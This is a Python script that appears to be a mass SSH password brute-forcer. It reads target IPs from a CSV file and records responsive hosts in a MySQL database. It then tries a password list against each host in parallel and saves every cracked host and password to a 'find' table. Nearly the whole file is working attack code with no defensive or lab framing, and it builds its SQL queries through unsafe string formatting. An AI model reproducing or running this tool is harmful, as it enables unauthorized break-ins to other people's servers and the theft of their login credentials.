#!/usr/bin/env python3
# coding: utf-8

import multiprocessing
from sshconnector import sshconnector
import pymysql
import asyncio

db = pymysql.connect("localhost", "root", "root", "hosts")


def add_unuse_hosts():
    def save_host(host):
        cursor = db.cursor()
        try:
            cursor.execute("INSERT INTO unuse (unuse_host) VALUES ('%s')" % host)
            db.commit()
        except:
            db.rollback()

    conn = sshconnector.Conn(db=db, thread_num=10, timeout=3)
    loop = asyncio.get_event_loop()
    conn.test_hosts(loop, './data/ip.csv', save_host)
    db.close()
    exit(0)


def try_password_task(host):
    def trash_callback(host):
        cursor = db.cursor()
        print('Host: %s is trashed' % host)
        try:
            cursor.execute("DELETE FROM unuse WHERE unuse_host = '%s'" % host)
            cursor.execute("INSERT INTO trash (trash_host) VALUES ('%s')" % host)
            db.commit()
        except:
            db.rollback()

    def find_callback(host, password):
        cursor = db.cursor()
        try:
            cursor.execute("DELETE FROM unuse WHERE unuse_host = '%s'" % host)
            cursor.execute("INSERT INTO find (find_host, find_password) VALUES ('%s', '%s')" % (host, password))
            db.commit()
        except:
            db.rollback()

    conn = sshconnector.Conn(host=host)
    conn.test_passwords('./data/passwords.txt', trash_callback, find_callback)


def try_password():
    process = multiprocessing.Pool(multiprocessing.cpu_count())
    cursor = db.cursor()
    try:
        cursor.execute("SELECT unuse_host FROM unuse")
        for host in cursor.fetchall():
            process.apply_async(try_password_task, args=(host[0],))
    except:
        pass
    process.close()
    process.join()
    db.close()
    exit(0)
